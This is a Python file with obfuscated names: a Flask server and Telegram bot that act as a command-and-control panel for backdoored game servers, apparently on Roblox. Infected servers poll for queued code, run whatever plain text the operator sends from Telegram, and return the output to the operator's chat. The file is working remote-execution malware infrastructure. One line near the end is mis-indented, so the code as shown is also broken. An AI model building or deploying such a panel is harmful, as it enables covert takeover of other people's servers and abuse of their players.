from flask import Flask, request, jsonify
import threading, time, requests, os, io, json

_k1 = os.environ.get("kek", "")
_k2 = int(os.environ.get("pep", "0"))
_k3 = os.environ.get("beb", "")

if not _k1 or not _k2 or not _k3:
    raise SystemExit("Config missing")

_a1 = Flask(__name__)
_a2 = []
_a3 = []
_a4 = threading.Lock()
_a5 = {}
_b1 = {"target": "all", "place": None, "job": None}

def _cleanup():
    while True:
        time.sleep(30)
        _now = time.time()
        with _a4:
            for _p in list(_a5.keys()):
                for _j in list(_a5[_p]["jobs"].keys()):
                    if _now - _a5[_p]["jobs"][_j]["t"] > 300:
                        del _a5[_p]["jobs"][_j]
                if not _a5[_p]["jobs"]:
                    del _a5[_p]

threading.Thread(target=_cleanup, daemon=True).start()

@_a1.route("/health")
def _h0():
    return "Ok"

@_a1.route("/")
def _h1():
    return "Alive"

@_a1.route("/poll")
def _h2():
    if request.args.get("token") != _k3:
        return jsonify({"error": "No"}), 403
    _pid = request.args.get("place", "0")
    _jid = request.args.get("job", "")
    _pl = request.args.get("players", "0")
    _mx = request.args.get("max", "0")
    _nm = request.args.get("name", "Unknown")
    _md = request.args.get("mode", "Server")
    try: _pid_i = int(_pid)
    except: _pid_i = 0
    try: _pl_i = int(_pl)
    except: _pl_i = 0
    try: _mx_i = int(_mx)
    except: _mx_i = 0
    with _a4:
        if _pid_i not in _a5:
            _a5[_pid_i] = {"name": _nm, "jobs": {}}
        else:
            _a5[_pid_i]["name"] = _nm
        _prev = _a5[_pid_i]["jobs"].get(_jid, {})
        _a5[_pid_i]["jobs"][_jid] = {
            "t": time.time(),
            "players": _pl_i,
            "max": _mx_i,
            "mode": _md,
            "idx": _prev.get("idx")
        }
        _out = []
        _rest = []
        for _c in _a2:
            _t = _c.get("target", "all")
            if _t == "all":
                _out.append(_c)
            elif _t == "place" and str(_c.get("place")) == str(_pid_i):
                _out.append(_c)
            elif _t == "job" and _c.get("job") == _jid:
                _out.append(_c)
            else:
                _rest.append(_c)
        _a2[:] = _rest
    return jsonify(_out)

@_a1.route("/result", methods=["POST"])
def _h3():
    if request.headers.get("X-Token") != _k3:
        return jsonify({"error": "No"}), 403
    _d = request.json or {}
    with _a4:
        _a3.append({
            "place": _d.get("place", 0),
            "job": _d.get("job", "?"),
            "cmd": _d.get("cmd"),
            "out": _d.get("out", "")[:100000]
        })
    return jsonify({"ok": True})

def _s1(_t, _kb=None):
    _data = {"chat_id": _k2, "text": _t[:4000]}
    if _kb:
        _data["reply_markup"] = json.dumps(_kb)
    try:
        requests.post("https://api.telegram.org/bot" + _k1 + "/sendMessage",
                      data=_data, timeout=10)
    except Exception as _e:
        print("Err:", _e)

def _s2(_n, _c):
    try:
        requests.post("https://api.telegram.org/bot" + _k1 + "/sendDocument",
                      data={"chat_id": _k2, "caption": _n},
                      files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
                      timeout=30)
    except Exception as _e:
        print("Err:", _e)

def _edit(_mid, _t, _kb=None):
    _data = {"chat_id": _k2, "message_id": _mid, "text": _t[:4000]}
    if _kb:
        _data["reply_markup"] = json.dumps(_kb)
    try:
        requests.post("https://api.telegram.org/bot" + _k1 + "/editMessageText",
                      data=_data, timeout=10)
    except Exception as _e:
        print("Err:", _e)

def _menu_games():
    with _a4:
        if not _a5:
            return "No active games.", {"inline_keyboard": [[{"text": "Refresh", "callback_data": "menu:games"}]]}
        _btns = []
        _btns.append([{"text": "All Games", "callback_data": "use:all:all"}])
        for _p, _info in _a5.items():
            _nm = _info.get("name", "Unknown")
            _js = _info.get("jobs", {})
            _total = sum(j["players"] for j in _js.values())
            _btns.append([{
                "text": f"{_nm} ({_total} Players)",
                "callback_data": f"menu:game:{_p}"
            }])
        _btns.append([{"text": "Refresh", "callback_data": "menu:games"}])
        return "Select a game:", {"inline_keyboard": _btns}

def _menu_game(_p):
    try: _p_i = int(_p)
    except: _p_i = _p
    with _a4:
        _info = _a5.get(_p_i)
        if not _info:
            return "Game offline.", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]}
        _nm = _info.get("name", "Unknown")
        _js = _info.get("jobs", {})
        _total = sum(j["players"] for j in _js.values())
        _btns = []
        _btns.append([{"text": f"All Servers ({_total} Players)", "callback_data": f"use:{_p}:all"}])
        _n = 0
        for _j, _ji in _js.items():
            _n += 1
            _ji["idx"] = _n
            _pl = _ji.get("players", 0)
            _mx = _ji.get("max", 0)
            _btns.append([{
                "text": f"Server {_n} ({_pl}/{_mx})",
                "callback_data": f"use:{_p}:{_j}"
            }])
        _btns.append([{"text": "Back", "callback_data": "menu:games"}])
        return f"{_nm}:", {"inline_keyboard": _btns}

def _p1():
    _l = None
    while True:
        try:
            _r = requests.get("https://api.telegram.org/bot" + _k1 + "/getUpdates",
                              params={"timeout": 25, "offset": _l + 1 if _l else -1},
                              timeout=35).json()
            if not _r.get("ok"):
                time.sleep(3); continue
            for _u in _r.get("result", []):
                _l = _u.get("update_id")

                _cb = _u.get("callback_query")
                if _cb:
                    _cdata = _cb.get("data", "")
                    _cid = _cb["message"]["chat"]["id"]
                    _mid = _cb["message"]["message_id"]

                    if _cid == _k2:
                        if _cdata == "menu:games":
                            _t, _kb = _menu_games()
                            _edit(_mid, _t, _kb)
                        elif _cdata.startswith("menu:game:"):
                            _p = _cdata.split(":", 2)[2]
                            _t, _kb = _menu_game(_p)
                            _edit(_mid, _t, _kb)
                        elif _cdata.startswith("use:"):
                            _, _p, _j = _cdata.split(":", 2)
                            if _p == "all":
                                _b1["target"] = "all"
                                _b1["place"] = None
                                _b1["job"] = None
                                _edit(_mid, "Target: All Games", {"inline_keyboard": [[{"text": "Back", "callback_data": "menu:games"}]]})
                            elif _j == "all":
                                _b1["target"] = "place"
                                _b1["place"] = _p
                                _b1["job"] = None
                                try: _p_i = int(_p)
                                except: _p_i = _p
                                _nm = _a5.get(_p_i, {}).get("name", _p)
                                _edit(_mid, f"Target: {_nm}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
                            else:
                                _b1["target"] = "job"
                                _b1["place"] = _p
                                _b1["job"] = _j
                                try: _p_i = int(_p)
                                except: _p_i = _p
                                _ji = _a5.get(_p_i, {}).get("jobs", {}).get(_j, {})
                                _idx = _ji.get("idx")
                                _label = f"Server {_idx}" if _idx else "Server"
                                _edit(_mid, f"Target: {_label}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
                    try:
                        requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                      data={"callback_query_id": _cb["id"]})
                    except: pass
                    continue

                _m = _u.get("message") or {}
                _c = (_m.get("chat") or {}).get("id")
                _x = (_m.get("text") or "").strip()
                if _c != _k2 or not _x: continue

                if _x == "/start":
                    _s1("ServerSide control\n\n"
                        "/games   Active games\n"
                        "/current Current target\n"
                        "/reset   Target = all\n\n"
                        "Plain text executes on the current target."); continue

                if _x == "/games":
                    _t, _kb = _menu_games()
                    _s1(_t, _kb)
                    continue

                if _x == "/current":
                    _s1(f"Target: {_b1['target']}\nGame: {_b1['place']}\nServer: {_b1['job']}")
                    continue

                if _x == "/reset":
                    _b1["target"] = "all"; _b1["place"] = None; _b1["job"] = None
                    _s1("Target: All Games"); continue

                if _x.startswith("all "):
                    _code = _x[4:]
                    with _a4:
                        _a2.append({"cmd": _code, "target": "all", "ts": time.time()})
                    _s1("Sent: All Games")
                    continue

                                _t = _b1["target"]
                if _t == "all":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "all", "ts": time.time()})
                    _s1("Sent: All Games")
                elif _t == "place":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time()})
                    _s1("Sent: All Servers")
                elif _t == "job":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
                    try: _p_i = int(_b1["place"])
                    except: _p_i = _b1["place"]
                    _ji = _a5.get(_p_i, {}).get("jobs", {}).get(_b1["job"], {})
                    _idx = _ji.get("idx")
                    _s1(f"Sent: Server {_idx}" if _idx else "Sent: Server")
        except Exception as _e:
            print("Err:", _e)
            time.sleep(3)

def _p2():
    while True:
        time.sleep(2)
        with _a4:
            if not _a3:
                continue
            _b = _a3[:]
            _a3.clear()
            _tgt = _b1["target"]
        for _x in _b:
            _c = _x.get("cmd") or ""
            _o = (_x.get("out") or "").strip()
            _pl = _x.get("place", 0)
            _j = _x.get("job", "?")
            with _a4:
                _info = _a5.get(_pl, {})
                _nm = _info.get("name", str(_pl))
                _ji = _info.get("jobs", {}).get(_j, {})
                _mode = _ji.get("mode", "Server")
                _idx = _ji.get("idx")
            if _tgt == "all":
                _tag = "[All Games]"
            elif _tgt == "place":
                _tag = f"[{_nm}/All Servers/{_mode}]"
            else:
                if _idx:
                    _tag = f"[{_nm}/Server {_idx}/{_mode}]"
                else:
                    _tag = f"[{_nm}/Server/{_mode}]"
            if _o.startswith("compile err:") or _o.startswith("runtime err:"):
                _s1(f"{_tag} Error\n{_o}")
            else:
                if not _o or _o == "nil":
                    _s1(f"{_tag} Done")
                else:
                    _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")

threading.Thread(target=_p1, daemon=True).start()
threading.Thread(target=_p2, daemon=True).start()

if __name__ == "__main__":
    _prt = int(os.environ.get("PORT", 8080))
    print("[+] Started", _prt)
    _a1.run(host="0.0.0.0", port=_prt, debug=False)
